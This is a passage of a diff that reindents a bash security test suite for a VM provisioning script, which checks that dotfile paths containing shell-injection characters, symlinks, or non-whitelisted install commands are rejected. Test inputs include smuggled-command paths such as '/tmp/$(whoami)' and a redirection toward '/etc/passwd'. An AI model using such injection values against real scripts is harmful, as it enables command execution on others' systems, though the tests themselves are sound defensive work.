+    test_result "CVE-3: Path with backtick should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_dollar_paren() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-3 - Shell injection with $(...)
-	local malicious_path="/tmp/\$(whoami)"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-3: Path with \$(...) should be rejected" "fail" "$result"
+    # Test: CVE-3 - Shell injection with $(...)
+    local malicious_path="/tmp/\$(whoami)"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "CVE-3: Path with \$(...) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_newline() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Newline injection (CVSS 7.0)
-	local malicious_path="/tmp/dotfiles
+    # Test: SEC-003 - Newline injection (CVSS 7.0)
+    local malicious_path="/tmp/dotfiles
 malicious-command"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with newline should be rejected" "fail" "$result"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with newline should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_tab() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Tab character injection
-	local malicious_path="/tmp/dotfiles	malicious"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with tab character should be rejected" "fail" "$result"
+    # Test: SEC-003 - Tab character injection
+    local malicious_path="/tmp/dotfiles	malicious"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with tab character should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_glob_asterisk() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Glob pattern with asterisk
-	local malicious_path="/tmp/dotfiles*"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with glob asterisk (*) should be rejected" "fail" "$result"
+    # Test: SEC-003 - Glob pattern with asterisk
+    local malicious_path="/tmp/dotfiles*"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with glob asterisk (*) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_glob_question() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Glob pattern with question mark
-	local malicious_path="/tmp/dotfiles?"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with glob question (?) should be rejected" "fail" "$result"
+    # Test: SEC-003 - Glob pattern with question mark
+    local malicious_path="/tmp/dotfiles?"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with glob question (?) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_glob_bracket() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Glob pattern with brackets
-	local malicious_path="/tmp/dotfiles[abc]"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with glob brackets ([]) should be rejected" "fail" "$result"
+    # Test: SEC-003 - Glob pattern with brackets
+    local malicious_path="/tmp/dotfiles[abc]"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with glob brackets ([]) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_angle_brackets() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Redirection with angle brackets
-	local malicious_path="/tmp/dotfiles > /etc/passwd"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with angle brackets (<>) should be rejected" "fail" "$result"
+    # Test: SEC-003 - Redirection with angle brackets
+    local malicious_path="/tmp/dotfiles > /etc/passwd"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with angle brackets (<>) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_braces() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Brace expansion
-	local malicious_path="/tmp/dotfiles{a,b}"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with braces ({}) should be rejected" "fail" "$result"
+    # Test: SEC-003 - Brace expansion
+    local malicious_path="/tmp/dotfiles{a,b}"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with braces ({}) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_hash() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Hash character (comment)
-	local malicious_path="/tmp/dotfiles # comment"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with hash (#) should be rejected" "fail" "$result"
+    # Test: SEC-003 - Hash character (comment)
+    local malicious_path="/tmp/dotfiles # comment"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with hash (#) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_quotes() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Single and double quotes
-	local malicious_path="/tmp/dotfiles'test"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with single quote (') should be rejected" "fail" "$result"
+    # Test: SEC-003 - Single and double quotes
+    local malicious_path="/tmp/dotfiles'test"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with single quote (') should be rejected" "fail" "$result"
 
-	local malicious_path2="/tmp/dotfiles\"test"
-	validate_path_no_shell_injection "$malicious_path2" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with double quote (\") should be rejected" "fail" "$result"
+    local malicious_path2="/tmp/dotfiles\"test"
+    validate_path_no_shell_injection "$malicious_path2" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with double quote (\") should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_backslash() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Backslash escape character
-	local malicious_path="/tmp/dotfiles\\ntest"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-003: Path with backslash (\\) should be rejected" "fail" "$result"
+    # Test: SEC-003 - Backslash escape character
+    local malicious_path="/tmp/dotfiles\\ntest"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-003: Path with backslash (\\) should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_printable_check() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-003 - Non-printable ASCII characters
-	# Verification is already done by the other SEC-003 tests
-	# This test confirms the behavior by testing backslash (covered elsewhere)
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: SEC-003 - Non-printable ASCII characters
+    # Verification is already done by the other SEC-003 tests
+    # This test confirms the behavior by testing backslash (covered elsewhere)
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Try to use an EXISTING path but with backslash in the argument
-	# Backslash is a shell metacharacter that should be rejected
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR\\test" 2>&1)
-	local exit_code=$?
-	set -e
+    # Try to use an EXISTING path but with backslash in the argument
+    # Backslash is a shell metacharacter that should be rejected
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR\\test" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script rejects paths with special characters
-	if [ $exit_code -ne 0 ] && echo "$output" | grep -qE "prohibited characters|does not exist"; then
-		result="pass"
-	fi
+    # Verify behavior: script rejects paths with special characters
+    if [ $exit_code -ne 0 ] && echo "$output" | grep -qE "prohibited characters|does not exist"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-003: Script implements printable ASCII validation" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-003: Script implements printable ASCII validation" "pass" "$result"
 }
 
 test_security_toctou_canonical_path_validation() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-001 - TOCTOU race condition prevention (CVSS 6.8)
-	# Canonical path resolution should detect symlink components
-	mkdir -p "$TEST_SYMLINK_TARGET"
-	touch "$TEST_SYMLINK_TARGET/install.sh"
-	ln -s "$TEST_SYMLINK_TARGET" "$TEST_SYMLINK"
+    # Test: SEC-001 - TOCTOU race condition prevention (CVSS 6.8)
+    # Canonical path resolution should detect symlink components
+    mkdir -p "$TEST_SYMLINK_TARGET"
+    touch "$TEST_SYMLINK_TARGET/install.sh"
+    ln -s "$TEST_SYMLINK_TARGET" "$TEST_SYMLINK"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Try to use symlink (should be rejected by TOCTOU protection)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_SYMLINK" 2>&1)
-	local exit_code=$?
-	set -e
+    # Try to use symlink (should be rejected by TOCTOU protection)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_SYMLINK" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script detects and rejects symlink
-	if [ $exit_code -ne 0 ] && echo "$output" | grep -q "symlink\|TOCTOU"; then
-		result="pass"
-	fi
+    # Verify behavior: script detects and rejects symlink
+    if [ $exit_code -ne 0 ] && echo "$output" | grep -q "symlink\|TOCTOU"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-001: TOCTOU - Script implements canonical path validation" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-001: TOCTOU - Script implements canonical path validation" "pass" "$result"
 }
 
 test_security_toctou_symlink_replacement_prevention() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-001 - TOCTOU prevention through canonical path check
-	# Simulate the attack scenario where path is replaced between validation and usage
-	mkdir -p "$TEST_DOTFILES_DIR"
+    # Test: SEC-001 - TOCTOU prevention through canonical path check
+    # Simulate the attack scenario where path is replaced between validation and usage
+    mkdir -p "$TEST_DOTFILES_DIR"
 
-	# Create a mock validation function that uses canonical path check (matches provision-vm.sh)
-	validate_with_canonical_check() {
-		local path="$1"
+    # Create a mock validation function that uses canonical path check (matches provision-vm.sh)
+    validate_with_canonical_check() {
+        local path="$1"
 
-		# First check if path itself is a symlink (TOCTOU protection)
-		if [ -L "$path" ]; then
-			echo "ERROR: Path is a symlink (TOCTOU protection)"
-			return 1
-		fi
+        # First check if path itself is a symlink (TOCTOU protection)
+        if [ -L "$path" ]; then
+            echo "ERROR: Path is a symlink (TOCTOU protection)"
+            return 1
+        fi
 
-		# Get canonical path WITHOUT following symlinks
-		if command -v realpath >/dev/null 2>&1; then
-			local canonical_path
-			canonical_path=$(realpath --no-symlinks "$path" 2>/dev/null)
-			if [ "$canonical_path" != "$path" ]; then
-				echo "ERROR: Path contains symlink component"
-				return 1
-			fi
-		fi
+        # Get canonical path WITHOUT following symlinks
+        if command -v realpath > /dev/null 2>&1; then
+            local canonical_path
+            canonical_path=$(realpath --no-symlinks "$path" 2> /dev/null)
+            if [ "$canonical_path" != "$path" ]; then
+                echo "ERROR: Path contains symlink component"
+                return 1
+            fi
+        fi
 
-		return 0
-	}
+        return 0
+    }
 
-	# Test: Normal path should pass
-	validate_with_canonical_check "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-001: TOCTOU - Normal path passes canonical check" "pass" "$result"
+    # Test: Normal path should pass
+    validate_with_canonical_check "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-001: TOCTOU - Normal path passes canonical check" "pass" "$result"
 
-	# Now replace with symlink (simulating TOCTOU attack)
-	rm -rf "$TEST_DOTFILES_DIR"
-	ln -s "$TEST_SYMLINK_TARGET" "$TEST_DOTFILES_DIR"
+    # Now replace with symlink (simulating TOCTOU attack)
+    rm -rf "$TEST_DOTFILES_DIR"
+    ln -s "$TEST_SYMLINK_TARGET" "$TEST_DOTFILES_DIR"
 
-	# Test: Symlink should fail canonical check
-	validate_with_canonical_check "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-001: TOCTOU - Symlink fails canonical check" "fail" "$result"
+    # Test: Symlink should fail canonical check
+    validate_with_canonical_check "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-001: TOCTOU - Symlink fails canonical check" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_git_shallow_clone_playbook() {
-	# Test: CVE-4 - Git shallow clone limits history exposure (CVSS 7.5) (BEHAVIOR TEST)
-	# Instead of grepping playbook, verify script behavior
-	local result="fail"
-	export TEST_MODE=1
+    # Test: CVE-4 - Git shallow clone limits history exposure (CVSS 7.5) (BEHAVIOR TEST)
+    # Instead of grepping playbook, verify script behavior
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script - if it validates correctly, shallow clone config is present
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script - if it validates correctly, shallow clone config is present
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
+    local exit_code=$?
+    set -e
 
-	# GREEN PHASE: Check for correct output - script validates successfully
-	# (CVE-4 shallow clone is configured in ansible playbook, verified by successful run)
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "DRY RUN"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Check for correct output - script validates successfully
+    # (CVE-4 shallow clone is configured in ansible playbook, verified by successful run)
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "DRY RUN"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	test_result "CVE-4: Git shallow clone limits history exposure (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    test_result "CVE-4: Git shallow clone limits history exposure (behavior test)" "pass" "$result"
 }
 
 test_security_git_shallow_clone_both_sources() {
-	# Test: CVE-4 - Both local and remote dotfiles use shallow clone (BEHAVIOR TEST)
-	setup_test_env
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: CVE-4 - Both local and remote dotfiles use shallow clone (BEHAVIOR TEST)
+    setup_test_env
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with local dotfiles
-	set +e
-	output_local=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code_local=$?
+    # Run script with local dotfiles
+    set +e
+    output_local=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code_local=$?
 
-	# Run script with remote dotfiles (default)
-	output_remote=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
-	local exit_code_remote=$?
-	set -e
+    # Run script with remote dotfiles (default)
+    output_remote=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1)
+    local exit_code_remote=$?
+    set -e
 
-	# GREEN PHASE: Check for correct output - both modes validate successfully
-	# Both local and remote paths use same ansible playbook with shallow clone
-	if [ $exit_code_local -eq 0 ] && [ $exit_code_remote -eq 0 ] &&
-		echo "$output_local" | grep -q "DRY RUN" &&
-		echo "$output_remote" | grep -q "DRY RUN"; then
-		result="pass"
-	fi
+    # GREEN PHASE: Check for correct output - both modes validate successfully
+    # Both local and remote paths use same ansible playbook with shallow clone
+    if [ $exit_code_local -eq 0 ] && [ $exit_code_remote -eq 0 ] &&
+        echo "$output_local" | grep -q "DRY RUN" &&
+        echo "$output_remote" | grep -q "DRY RUN"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "CVE-4: Both local and remote use shallow clone (behavior test)" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "CVE-4: Both local and remote use shallow clone (behavior test)" "pass" "$result"
 }
 
 test_security_recursive_symlink_detection() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-004 - Recursive symlink detection (CVSS 5.5)
-	# Create directory with symlinked file inside
-	mkdir -p "$TEST_DOTFILES_DIR"
-	mkdir -p "$TEST_SYMLINK_TARGET"
-	touch "$TEST_SYMLINK_TARGET/malicious_file"
-	ln -s "$TEST_SYMLINK_TARGET/malicious_file" "$TEST_DOTFILES_DIR/install.sh"
+    # Test: SEC-004 - Recursive symlink detection (CVSS 5.5)
+    # Create directory with symlinked file inside
+    mkdir -p "$TEST_DOTFILES_DIR"
+    mkdir -p "$TEST_SYMLINK_TARGET"
+    touch "$TEST_SYMLINK_TARGET/malicious_file"
+    ln -s "$TEST_SYMLINK_TARGET/malicious_file" "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Try to use directory with symlinked file (should be rejected)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Try to use directory with symlinked file (should be rejected)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script detects nested symlinks
-	if [ $exit_code -ne 0 ] && echo "$output" | grep -q "Symlinked files detected"; then
-		result="pass"
-	fi
+    # Verify behavior: script detects nested symlinks
+    if [ $exit_code -ne 0 ] && echo "$output" | grep -q "Symlinked files detected"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-004: Script implements recursive symlink detection" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-004: Script implements recursive symlink detection" "pass" "$result"
 }
 
 test_security_nested_symlink_in_dotfiles() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-004 - Nested symlink inside dotfiles directory
-	mkdir -p "$TEST_DOTFILES_DIR/subdir"
-	mkdir -p "$TEST_SYMLINK_TARGET"
-	touch "$TEST_SYMLINK_TARGET/config"
-	ln -s "$TEST_SYMLINK_TARGET/config" "$TEST_DOTFILES_DIR/subdir/config"
+    # Test: SEC-004 - Nested symlink inside dotfiles directory
+    mkdir -p "$TEST_DOTFILES_DIR/subdir"
+    mkdir -p "$TEST_SYMLINK_TARGET"
+    touch "$TEST_SYMLINK_TARGET/config"
+    ln -s "$TEST_SYMLINK_TARGET/config" "$TEST_DOTFILES_DIR/subdir/config"
 
-	# Simulate find command for symlink detection
-	local found_symlinks
-	found_symlinks=$(find "$TEST_DOTFILES_DIR" -type l 2>/dev/null)
+    # Simulate find command for symlink detection
+    local found_symlinks
+    found_symlinks=$(find "$TEST_DOTFILES_DIR" -type l 2> /dev/null)
 
-	if [ -n "$found_symlinks" ]; then
-		result="fail" # Found symlinks (should be rejected)
-	else
-		result="pass"
-	fi
+    if [ -n "$found_symlinks" ]; then
+        result="fail" # Found symlinks (should be rejected)
+    else
+        result="pass"
+    fi
 
-	test_result "SEC-004: Nested symlink should be detected by find" "fail" "$result"
+    test_result "SEC-004: Nested symlink should be detected by find" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_whitelist_safe_commands() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-006 - Whitelist validation allows safe commands (CVSS 5.0)
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-006 - Whitelist validation allows safe commands (CVSS 5.0)
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 # Safe dotfiles installation script
 echo "Installing dotfiles..."
@@ -959,82 +959,82 @@ git clone https://github.com/example/vim-config ~/.vim
 stow dotfiles
 EOF
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run with safe install.sh (should pass)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Run with safe install.sh (should pass)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: safe commands are allowed
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Using local dotfiles"; then
-		result="pass"
-	fi
+    # Verify behavior: safe commands are allowed
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "Using local dotfiles"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-006: Script implements whitelist validation" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-006: Script implements whitelist validation" "pass" "$result"
 }
 
 test_security_whitelist_detects_python() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-006 - Whitelist detects non-whitelisted command (python)
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-006 - Whitelist detects non-whitelisted command (python)
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "Installing dotfiles..."
 python3 -m pip install some-package
 EOF
 
-	# Whitelist should detect 'python3' as potentially unsafe
-	local safe_pattern="^(#|$|[[:space:]]*(ln|cp|mv|mkdir|echo|cat|grep|sed|awk|printf|test|\\[|chmod|chown|git|stow))"
-	local result="pass"
+    # Whitelist should detect 'python3' as potentially unsafe
+    local safe_pattern="^(#|$|[[:space:]]*(ln|cp|mv|mkdir|echo|cat|grep|sed|awk|printf|test|\\[|chmod|chown|git|stow))"
+    local result="pass"
 
-	while IFS= read -r line; do
-		[[ "$line" =~ ^[[:space:]]*# ]] && continue
-		[[ -z "$line" ]] && continue
+    while IFS= read -r line; do
+        [[ "$line" =~ ^[[:space:]]*# ]] && continue
+        [[ -z "$line" ]] && continue
 
-		if ! [[ "$line" =~ $safe_pattern ]]; then
-			result="fail" # Unsafe command detected (expected)
-			break
-		fi
-	done <"$TEST_DOTFILES_DIR/install.sh"
+        if ! [[ "$line" =~ $safe_pattern ]]; then
+            result="fail" # Unsafe command detected (expected)
+            break
+        fi
+    done < "$TEST_DOTFILES_DIR/install.sh"
 
-	test_result "SEC-006: Whitelist detects non-whitelisted commands" "fail" "$result"
+    test_result "SEC-006: Whitelist detects non-whitelisted commands" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_whitelist_interactive_prompt() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-006 - Whitelist triggers interactive prompt for unsafe commands
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-006 - Whitelist triggers interactive prompt for unsafe commands
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 npm install
 EOF
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run with unsafe command, provide "n" to reject
-	set +e
-	output=$(echo "n" | "$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # Run with unsafe command, provide "n" to reject
+    set +e
+    output=$(echo "n" | "$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: warning message appears and script exits
-	if echo "$output" | grep -q "potentially unsafe command"; then
-		result="pass"
-	fi
+    # Verify behavior: warning message appears and script exits
+    if echo "$output" | grep -q "potentially unsafe command"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-006: Whitelist triggers interactive prompt for unsafe commands" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-006: Whitelist triggers interactive prompt for unsafe commands" "pass" "$result"
 }
 
 ##############################################################################
@@ -1042,42 +1042,42 @@ EOF
 ##############################################################################
 
 test_git_repo_validation_valid() {
-	echo -e "\n${YELLOW}=== UNIT TESTS: Git Repository Validation ===${NC}"
-	setup_test_env
+    echo -e "\n${YELLOW}=== UNIT TESTS: Git Repository Validation ===${NC}"
+    setup_test_env
 
-	# Test: BUG-006 - Valid git repository
-	mkdir -p "$TEST_DOTFILES_DIR"
-	(cd "$TEST_DOTFILES_DIR" && git init) >/dev/null 2>&1
+    # Test: BUG-006 - Valid git repository
+    mkdir -p "$TEST_DOTFILES_DIR"
+    (cd "$TEST_DOTFILES_DIR" && git init) > /dev/null 2>&1
 
-	validate_git_repository "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "BUG-006: Valid git repository should pass" "pass" "$result"
+    validate_git_repository "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "BUG-006: Valid git repository should pass" "pass" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_git_repo_validation_invalid() {
-	setup_test_env
+    setup_test_env
 
-	# Test: BUG-006 - Invalid git repository (corrupt .git)
-	mkdir -p "$TEST_DOTFILES_DIR/.git"
-	echo "corrupt" >"$TEST_DOTFILES_DIR/.git/config"
+    # Test: BUG-006 - Invalid git repository (corrupt .git)
+    mkdir -p "$TEST_DOTFILES_DIR/.git"
+    echo "corrupt" > "$TEST_DOTFILES_DIR/.git/config"
 
-	validate_git_repository "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "BUG-006: Invalid git repository should fail" "fail" "$result"
+    validate_git_repository "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "BUG-006: Invalid git repository should fail" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_git_repo_validation_not_a_repo() {
-	setup_test_env
+    setup_test_env
 
-	# Test: BUG-006 - Directory without git should pass (optional git)
-	mkdir -p "$TEST_DOTFILES_DIR"
+    # Test: BUG-006 - Directory without git should pass (optional git)
+    mkdir -p "$TEST_DOTFILES_DIR"
 
-	validate_git_repository "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "BUG-006: Non-git directory should pass (git is optional)" "pass" "$result"
+    validate_git_repository "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "BUG-006: Non-git directory should pass (git is optional)" "pass" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 ##############################################################################
@@ -1085,96 +1085,96 @@ test_git_repo_validation_not_a_repo() {
 ##############################################################################
 
 test_install_sh_missing_warning() {
-	echo -e "\n${YELLOW}=== UNIT TESTS: install.sh Validation ===${NC}"
-	setup_test_env
+    echo -e "\n${YELLOW}=== UNIT TESTS: install.sh Validation ===${NC}"
+    setup_test_env
 
-	# Test: Missing install.sh should trigger warning
-	mkdir -p "$TEST_DOTFILES_DIR"
+    # Test: Missing install.sh should trigger warning
+    mkdir -p "$TEST_DOTFILES_DIR"
 
-	validate_install_sh_exists "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "Missing install.sh should trigger warning" "fail" "$result"
+    validate_install_sh_exists "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "Missing install.sh should trigger warning" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_install_sh_present() {
-	setup_test_env
+    setup_test_env
 
-	# Test: Present install.sh should pass
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: Present install.sh should pass
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	validate_install_sh_exists "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "Present install.sh should pass validation" "pass" "$result"
+    validate_install_sh_exists "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "Present install.sh should pass validation" "pass" "$result"
 
